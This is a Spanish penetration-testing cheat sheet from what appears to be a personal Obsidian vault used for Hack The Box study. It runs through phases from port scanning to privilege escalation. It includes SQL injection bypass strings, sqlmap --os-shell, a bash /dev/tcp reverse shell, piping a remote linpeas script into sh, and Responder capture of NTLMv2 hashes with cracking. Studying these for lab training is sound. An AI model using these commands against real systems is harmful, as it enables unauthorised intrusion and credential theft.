---
tags:
  - cheatsheet
  - referencia
aliases:
  - Cheatsheet Master
---
# ⚡ Cheatsheet Master — Comandos por Fase

> [!info] Uso
> Referencia rápida para repaso y examen. Un comando por línea, sin teoría. La teoría vive en [[Metodologia_HTB]] y en las notas de [[00_Index#Base de Técnicas|Técnicas]].

---

## 1. Reconocimiento

```bash
nmap -p- --min-rate 5000 -oN ports.txt <IP>              # todos los puertos, rápido
nmap -sCV -p <puertos> -oN detail.txt <IP>               # versión + scripts default
sudo nmap -sU --top-ports 20 <IP>                        # UDP si TCP no da nada
```

Árbol post-nmap: **21** FTP anon · **22** SSH · **23** Telnet · **80/443** web · **139/445** SMB · **3306** MySQL · **5985** WinRM · **6379** Redis.

---

## 2. Enumeración

```bash
# Web
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html
gobuster vhost -u http://<dominio> -w subdomains-top1million-5000.txt --append-domain
whatweb http://<IP>; curl -I http://<IP>
# SMB
smbclient -N -L \\\\<IP>            # listar shares sin auth
smbclient -U <user> \\\\<IP>\\<share>
smbmap -H <IP>; enum4linux -a <IP>
# SNMP
snmpwalk -v 2c -c public <IP>
onesixtyone -c dict.txt <IP>
```

---

## 3. Explotación por servicio

```bash
# FTP anónimo
ftp <IP>            # anonymous / (enter) → ls, get <archivo>
ftp -p <IP>         # modo pasivo (cliente abre conexión de datos) — útil tras NAT/firewall
# MySQL sin auth
mysql -h <IP> -u root --skip-ssl        # --skip-ssl si ERROR 2026
# Redis sin auth
redis-cli -h <IP>   # INFO keyspace → KEYS * → GET <key>
# SQLi login bypass
username=admin'-- -           # ojo: MySQL exige espacio tras --
username=' OR '1'='1'-- -
# SQLi → RCE
sqlmap -u '<url>?p=x' --cookie="PHPSESSID=<v>" --batch
sqlmap -u '<url>?p=x' --cookie="PHPSESSID=<v>" --os-shell   # depende de privilegios DB
```

---

## 4. Shell + estabilización

```bash
bash -c 'bash -i >& /dev/tcp/<IP_tun0>/<puerto> 0>&1'    # IP = tun0 propia, NO víctima
nc -lvnp <puerto>
# Estabilizar (orden estricto):
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 5. Escalación de privilegios (Linux)

```bash
id; sudo -l                                  # sudo -l SIEMPRE primero
find / -perm -4000 2>/dev/null               # SUID
cat /etc/crontab; ls /etc/cron.d/
grep -ri 'password' /var/www/html/*.php      # creds en config de la app
curl -L .../linpeas.sh | sh                  # automatizado
```

GTFOBins: ante cualquier binario en `sudo -l` → `gtfobins.github.io/gtfobins/<bin>#sudo`. Editores (vi/less/man): `:set shell=/bin/sh` + `:shell` desde dentro.

---

## 6. Credenciales / cracking

```bash
zip2john file.zip > h.txt; john --wordlist=rockyou.txt h.txt
hashid '<hash>'; hashcat -a 0 -m 0 h.txt rockyou.txt        # -m 0 MD5
hashcat -m 5600 ntlmv2.txt rockyou.txt                      # NetNTLMv2
john -w=rockyou.txt hash.txt                                # NetNTLMv2 (netntlmv2)
sudo responder -I tun0                                      # captura NTLMv2
evil-winrm -i <IP> -u <user> -p <pass>                      # WinRM con creds
```

---

## Ver también

- [[Metodologia_HTB]] — protocolo completo y regla de los 45 min
- [[00_Index]] — estado de máquinas y base de técnicas
- [[Cheatsheets/Command Basics Tmux|Tmux]]
- [[Técnicas/2_Enumeración/SNMP_Enumeration|SNMP Enumeration]]
